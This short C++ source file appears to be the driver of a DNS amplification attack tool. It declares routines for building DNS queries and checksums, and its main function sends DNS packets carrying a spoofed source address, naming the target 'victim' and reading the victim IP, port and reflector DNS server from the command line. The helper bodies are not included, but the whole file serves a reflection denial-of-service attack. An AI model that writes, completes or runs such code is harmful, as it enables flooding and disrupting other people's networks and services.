#include "dnsamp.h"

void Print_error(string error);
void SendDnsPacket(string dnsip, string spoofip, int port);
void CreateDnsHeader(dh *dns);
void CreateQueryInfo(query *q);
unsigned short CheckSum(unsigned short *ptr, int size);
unsigned short CheckUdpSum(int length, unsigned short *ptr);


int main(int argc, char *argv[]){
	
	string victim = argv[1];
	int udp_port = atoi(argv[2]);
	string dns_server = argv[3];

	for(int i = 0; i < 3; i++)
		SendDnsPacket(dns_server, victim, udp_port);

	return 0;
}